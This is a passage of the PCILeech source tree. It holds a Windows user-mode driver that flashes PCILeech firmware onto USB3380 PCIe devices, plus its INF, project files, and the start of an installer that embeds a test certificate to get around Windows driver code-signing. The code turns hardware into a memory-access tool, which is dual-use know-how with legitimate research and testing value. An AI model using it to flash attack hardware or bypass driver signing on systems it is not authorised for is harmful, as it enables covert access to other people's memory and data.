		dwdata = *(unsigned int*)(g_firmware_pcileech + dwaddr);
		*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_DATA) = dwdata;
		// write to CTL register to start EEPROM write (and wait for device)
		dwdata = *(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL);
		dwdata = (0x00ff0000 & dwdata) | 0x03004000 | (dwaddr >> 2);
		*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL) = dwdata;
		msleep(DEVICE_WAIT_TIME);
		// next DWORD
		dwaddr += 4;
	}
}

static int _action_flash_writeverify(unsigned char *pbar0)
{
	// 1: check if this is a valid device / memory range.
	if(*(unsigned int*)(pbar0 + OFFSET_PCIREG_SUBSYS) != 0x338010B5) {
		return -2;
	}
	if(*(unsigned int*)(pbar0 + OFFSET_PCIREG_VEN_DEV) != 0x338010B5 && *(unsigned int*)(pbar0 + OFFSET_PCIREG_VEN_DEV) != 0x16BC14E4) {
		return -2;
	}
	// 2: check if EEPROM exists
	if((*(unsigned int*)(pbar0 + OFFSET_PCIREG_EEPROM_CTL) & 0x00030000) == 0) {
		return -3;
	}
	// 4: is firmware already flashed?
	if(0 == _action_flash_verify(pbar0)) {
		SET_LED(0xf); // success -> blue+red led
		return 0;
	}
	// 4: flash firmware.
	_action_flash_write(pbar0);
	// 5: verify flashed firmware.
	if(0 == _action_flash_verify(pbar0)) {
		SET_LED(0x8); // success -> blue led
		return 0;
	}
	SET_LED(0x7); // fail -> red led
	return -1;
}

// -----------------------------------------------------------------------------
// END SHARED CODE WITH WINDOWS/LINUX FLASH PCILEECH FIRMWARE
// -----------------------------------------------------------------------------

NTSTATUS _EvtDevicePrepareHardware(_In_ WDFDEVICE Device, _In_ WDFCMRESLIST ResourcesRaw, _In_ WDFCMRESLIST ResourcesTranslated)
{
	ULONG i;
	NTSTATUS status;
	PBYTE BaseAddress;
	PVOID PseudoBaseAddress;
	PCM_PARTIAL_RESOURCE_DESCRIPTOR desc;
	UNREFERENCED_PARAMETER(ResourcesTranslated);
	for(i = 0; i < WdfCmResourceListGetCount(ResourcesRaw); i++) {
		desc = WdfCmResourceListGetDescriptor(ResourcesRaw, i);
		if(desc->Type != CmResourceTypeMemory || desc->u.Generic.Length != 0x2000) {
			continue;
		}
		status = WdfDeviceMapIoSpace(Device, desc->u.Generic.Start, desc->u.Generic.Length, MmNonCached, &PseudoBaseAddress);
		if(NT_ERROR(status)) {
			continue;
		}
		BaseAddress = (PBYTE)WdfDeviceGetHardwareRegisterMappedAddress(Device, PseudoBaseAddress);
		status = _action_flash_writeverify(BaseAddress);
		if(status) {
			// try force 1-byte addressing and make another flash attempt.
			*(unsigned char*)(BaseAddress + OFFSET_PCIREG_EEPROM_CTL + 2) =
				0x60 | (0x1f & *(unsigned char*)(BaseAddress + OFFSET_PCIREG_EEPROM_CTL + 2));
			status = _action_flash_writeverify(BaseAddress);
		}
		if(status) {
			// try force 2-byte addressing and make another flash attempt.
			*(unsigned char*)(BaseAddress + OFFSET_PCIREG_EEPROM_CTL + 2) =
				0xa0 | (0x1f & *(unsigned char*)(BaseAddress + OFFSET_PCIREG_EEPROM_CTL + 2));
			status = _action_flash_writeverify(BaseAddress);
		}
		WdfDeviceUnmapIoSpace(Device, PseudoBaseAddress, desc->u.Generic.Length);
		return (status == 0) ? STATUS_SUCCESS : STATUS_DEVICE_CONFIGURATION_ERROR;
	}
	return STATUS_BAD_DEVICE_TYPE;
}

NTSTATUS _EvtDeviceAdd(_In_ WDFDRIVER Driver, _Inout_ PWDFDEVICE_INIT DeviceInit)
{
	WDFDEVICE device;
	WDF_PNPPOWER_EVENT_CALLBACKS pnpPowerCallbacks;
	UNREFERENCED_PARAMETER(Driver);
	WDF_PNPPOWER_EVENT_CALLBACKS_INIT(&pnpPowerCallbacks);
	pnpPowerCallbacks.EvtDevicePrepareHardware = _EvtDevicePrepareHardware;
	WdfDeviceInitSetPnpPowerEventCallbacks(DeviceInit, &pnpPowerCallbacks);
	return WdfDeviceCreate(&DeviceInit, WDF_NO_OBJECT_ATTRIBUTES, &device);
}

NTSTATUS _EvtDeviceAdd_FlashDisable(_In_ WDFDRIVER Driver, _Inout_ PWDFDEVICE_INIT DeviceInit)
{
	UNREFERENCED_PARAMETER(Driver);
	UNREFERENCED_PARAMETER(DeviceInit);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	WDF_DRIVER_CONFIG config;
	WDFKEY regKey;
	ULONG regDisable = 0;
	UNICODE_STRING usDisable;
	// check if flash disable reg entry is set
	RtlInitUnicodeString(&usDisable, L"disable");
	status = WdfRegistryOpenKey(NULL, RegistryPath, GENERIC_READ, NULL, &regKey);
	if(NT_SUCCESS(status)) {
		WdfRegistryQueryULong(regKey, &usDisable, &regDisable);
		WdfRegistryClose(regKey);
	}
	// initialize driver
	if(regDisable == 1) {
		WDF_DRIVER_CONFIG_INIT(&config, _EvtDeviceAdd_FlashDisable);
	} else {
		WDF_DRIVER_CONFIG_INIT(&config, _EvtDeviceAdd);
	}
	return WdfDriverCreate(DriverObject,
		RegistryPath,
		WDF_NO_OBJECT_ATTRIBUTES,
		&config,
		WDF_NO_HANDLE
	);
}

```

`usb3380_flash/windows/USB3380Flash/USB3380Flash.h`:

```h
// USB3380Flash.h : header for PCILeech UMDF2 flash driver.
//
// Author: Ulf Frisk, pcileech@frizk.net
//
#include <windows.h>
#include <wdf.h>

EXTERN_C_START

DRIVER_INITIALIZE DriverEntry;

EXTERN_C_END

```

`usb3380_flash/windows/USB3380Flash/USB3380Flash.inf`:

```inf
;
; USB3380Flash.inf
;

[Version]
Signature="$Windows NT$"
Class=System
ClassGuid={4d36e97d-e325-11ce-bfc1-08002be10318}
Provider=%ManufacturerName%
CatalogFile=USB3380Flash.cat
DriverVer=

[Manufacturer]
%ManufacturerName%=Standard,NT$ARCH$

[Standard.NT$ARCH$]
%DeviceName%=USB3380Flash_Install, PCI\VEN_14E4&DEV_16BC&SUBSYS_338010B5
%DeviceName%=USB3380Flash_Install, PCI\VEN_10B5&DEV_3380&SUBSYS_338010B5

[SourceDisksFiles]
USB3380Flash.dll=1

[SourceDisksNames]
1 = %DiskName%

; =================== UMDF Device ==================================

[USB3380Flash_Install.NT]
CopyFiles=UMDriverCopy

[USB3380Flash_Install.NT.hw]

[USB3380Flash_Install.NT.Services]
AddService=WUDFRd,0x000001fa,WUDFRD_ServiceInstall

[USB3380Flash_Install.NT.CoInstallers]
AddReg=CoInstallers_AddReg

[USB3380Flash_Install.NT.Wdf]
UmdfService=USB3380Flash,USB3380Flash_Install
UmdfServiceOrder=USB3380Flash
UmdfDirectHardwareAccess=AllowDirectHardwareAccess 
UmdfRegisterAccessMode=RegisterAccessUsingUserModeMapping

[USB3380Flash_Install]
UmdfLibraryVersion=$UMDFVERSION$ 
ServiceBinary=%12%\UMDF\USB3380Flash.dll

[WUDFRD_ServiceInstall]
DisplayName = %WudfRdDisplayName%
ServiceType = 1
StartType = 3
ErrorControl = 1
ServiceBinary = %12%\WUDFRd.sys

[CoInstallers_AddReg]
HKR,,CoInstallers32,0x00010000,"WUDFCoinstaller.dll"

[DestinationDirs]
UMDriverCopy=12,UMDF

[UMDriverCopy]
USB3380Flash.dll

; =================== Generic ==================================

[Strings]
ManufacturerName="PCILeech"
ClassName="System"
DiskName = "PCILeech PCIe Device AutoFlasher Installation"
WudfRdDisplayName="Windows Driver Foundation - User-mode Driver Framework Reflector"
DeviceName="PCILeech PCIe Device"

```

`usb3380_flash/windows/USB3380Flash/USB3380Flash.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
</Project>
```

`usb3380_flash/windows/USB3380Flash/USB3380Flash.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="ReleaseMT|x64">
      <Configuration>ReleaseMT</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="USB3380Flash.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="USB3380Flash.h" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{E11BECC1-685F-41B9-A352-A6127FAB3758}</ProjectGuid>
    <TemplateGuid>{32909489-7be5-497b-aafa-db6669d9b44b}</TemplateGuid>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>PCILeechFlash</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
    <ProjectName>USB3380Flash</ProjectName>
  </PropertyGroup>
  <PropertyGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <PlatformToolset>WindowsUserModeDriver10.0</PlatformToolset>
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <PlatformToolset>WindowsUserModeDriver10.0</PlatformToolset>
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseMT|x64'" Label="PropertySheets">
    <PlatformToolset>WindowsUserModeDriver10.0</PlatformToolset>
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <UMDF_VERSION_MAJOR>2</UMDF_VERSION_MAJOR>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <UMDF_VERSION_MAJOR>2</UMDF_VERSION_MAJOR>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseMT|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <UMDF_VERSION_MAJOR>2</UMDF_VERSION_MAJOR>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengRemoteDebugger</DebuggerFlavor>
    <OutDir>$(SolutionDir)\files\USB3380Flash\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
    <Inf2CatUseLocalTime>true</Inf2CatUseLocalTime>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengRemoteDebugger</DebuggerFlavor>
    <OutDir>$(SolutionDir)\files\USB3380Flash\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
    <Inf2CatUseLocalTime>true</Inf2CatUseLocalTime>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseMT|x64'">
    <DebuggerFlavor>DbgengRemoteDebugger</DebuggerFlavor>
    <OutDir>$(SolutionDir)\files\USB3380Flash\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
    <Inf2CatUseLocalTime>true</Inf2CatUseLocalTime>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WppEnabled>false</WppEnabled>
      <WppRecorderEnabled>true</WppRecorderEnabled>
      <WppScanConfigurationData Condition="'%(ClCompile.ScanConfigurationData)' == ''">trace.h</WppScanConfigurationData>
    </ClCompile>
    <Inf>
      <TimeStamp>*</TimeStamp>
    </Inf>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WppEnabled>false</WppEnabled>
      <WppRecorderEnabled>true</WppRecorderEnabled>
      <WppScanConfigurationData Condition="'%(ClCompile.ScanConfigurationData)' == ''">trace.h</WppScanConfigurationData>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseMT|x64'">
    <ClCompile>
      <WppEnabled>false</WppEnabled>
      <WppRecorderEnabled>true</WppRecorderEnabled>
      <WppScanConfigurationData Condition="'%(ClCompile.ScanConfigurationData)' == ''">trace.h</WppScanConfigurationData>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <Inf Include="USB3380Flash.inf" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`usb3380_flash/windows/USB3380Flash/USB3380Flash.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="USB3380Flash.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="USB3380Flash.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="USB3380Flash.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
</Project>
```

`usb3380_flash/windows/USB3380Flash/USB3380Flash.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`usb3380_flash/windows/USB3380Flash_Installer/USB3380Flash_Installer.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="ReleaseMT|x64">
      <Configuration>ReleaseMT</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{F2F4AA4A-BEFE-4738-9412-820007919334}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>PCILeechFlash_Installer</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>USB3380Flash_installer</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseMT|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseMT|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>$(SolutionDir)\files\USB3380Flash_installer\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)\files\USB3380Flash_installer\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseMT|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)\files\USB3380Flash_installer\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
    <PostBuildEvent>
      <Command>powershell Compress-Archive -Path '$(SolutionDir)\files\USB3380Flash\USB3380Flash\*.*', '$(SolutionDir)\files\USB3380Flash_installer\USB3380Flash_installer.exe' -DestinationPath '$(SolutionDir)\files\USB3380Flash.zip' -Force -CompressionLevel Optimal
del "$(SolutionDir)\files\pcileech_files.zip"
powershell Compress-Archive -Path '$(SolutionDir)\files\*.*' -DestinationPath '$(SolutionDir)\files\pcileech_files.zip' -Force -CompressionLevel Optimal</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
      <ProgramDatabaseFile />
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
    </Link>
    <PostBuildEvent>
      <Command>powershell Compress-Archive -Path '$(SolutionDir)\files\USB3380Flash\USB3380Flash\*.*', '$(SolutionDir)\files\USB3380Flash_installer\USB3380Flash_installer.exe' -DestinationPath '$(SolutionDir)\files\USB3380Flash.zip' -Force -CompressionLevel Optimal
del "$(SolutionDir)\files\pcileech_files.zip"
powershell Compress-Archive -Path '$(SolutionDir)\files\*.*' -DestinationPath '$(SolutionDir)\files\pcileech_files.zip' -Force -CompressionLevel Optimal</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseMT|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
      <ProgramDatabaseFile>
      </ProgramDatabaseFile>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
    </Link>
    <PostBuildEvent>
      <Command>powershell Compress-Archive -Path '$(SolutionDir)\files\USB3380Flash\USB3380Flash\*.*', '$(SolutionDir)\files\USB3380Flash_installer\USB3380Flash_installer.exe' -DestinationPath '$(SolutionDir)\files\USB3380Flash.zip' -Force -CompressionLevel Optimal
</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="installer.c" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`usb3380_flash/windows/USB3380Flash_Installer/USB3380Flash_Installer.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="installer.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`usb3380_flash/windows/USB3380Flash_Installer/USB3380Flash_Installer.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`usb3380_flash/windows/USB3380Flash_Installer/installer.c`:

```c
// installer.c : flash driver installation program.
// required to get around windows code signing requirement when importing UMDF
// drivers into the system driver store.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
#include <Windows.h>
#include <Newdev.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "newdev.lib")

#define CONFIG_PATH_INF "USB3380Flash.inf"

const BYTE SIGNER_CERTIFICATE[] = {
	0x30, 0x82, 0x03, 0x0e, 0x30, 0x82, 0x01, 0xf6, 0xa0, 0x03, 0x02, 0x01,
	0x02, 0x02, 0x10, 0x32, 0xca, 0x16, 0x38, 0xfd, 0xc9, 0x6d, 0xa6, 0x4f,
	0x36, 0xb9, 0x22, 0x68, 0x3d, 0xba, 0xb4, 0x30, 0x0d, 0x06, 0x09, 0x2a,
	0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x30,
	0x31, 0x2e, 0x30, 0x2c, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x25, 0x57,
	0x44, 0x4b, 0x54, 0x65, 0x73, 0x74, 0x43, 0x65, 0x72, 0x74, 0x20, 0x75,
	0x6c, 0x66, 0x72, 0x31, 0x31, 0x2c, 0x31, 0x33, 0x30, 0x38, 0x37, 0x32,
	0x33, 0x32, 0x33, 0x32, 0x36, 0x32, 0x37, 0x31, 0x38, 0x34, 0x30, 0x38,
	0x30, 0x1e, 0x17, 0x0d, 0x31, 0x35, 0x30, 0x39, 0x32, 0x30, 0x31, 0x34,
	0x31, 0x38, 0x34, 0x37, 0x5a, 0x17, 0x0d, 0x32, 0x35, 0x30, 0x39, 0x32,
	0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5a, 0x30, 0x30, 0x31, 0x2e,
	0x30, 0x2c, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x25, 0x57, 0x44, 0x4b,
	0x54, 0x65, 0x73, 0x74, 0x43, 0x65, 0x72, 0x74, 0x20, 0x75, 0x6c, 0x66,
	0x72, 0x31, 0x31, 0x2c, 0x31, 0x33, 0x30, 0x38, 0x37, 0x32, 0x33, 0x32,
	0x33, 0x32, 0x36, 0x32, 0x37, 0x31, 0x38, 0x34, 0x30, 0x38, 0x30, 0x82,
	0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d,
	0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00, 0x30, 0x82,
	0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xc8, 0x54, 0xde, 0x6d, 0xfd,
	0x19, 0x97, 0x3f, 0xf0, 0x6e, 0x8a, 0xc2, 0xff, 0x32, 0xbd, 0x61, 0x3d,
	0x9c, 0xbc, 0xd7, 0x0e, 0x80, 0x51, 0x6e, 0xf1, 0xf2, 0xf3, 0x0f, 0x54,
	0x24, 0x82, 0xa4, 0x48, 0xfa, 0xd8, 0xcb, 0xf0, 0x43, 0xc6, 0x44, 0xde,
	0x61, 0x14, 0xe2, 0xf6, 0xc8, 0xf9, 0x2a, 0xb2, 0x61, 0x46, 0xd8, 0x9b,
	0xc6, 0x99, 0x71, 0x1f, 0x05, 0xae, 0x39, 0xd1, 0x86, 0x28, 0x34, 0x63,
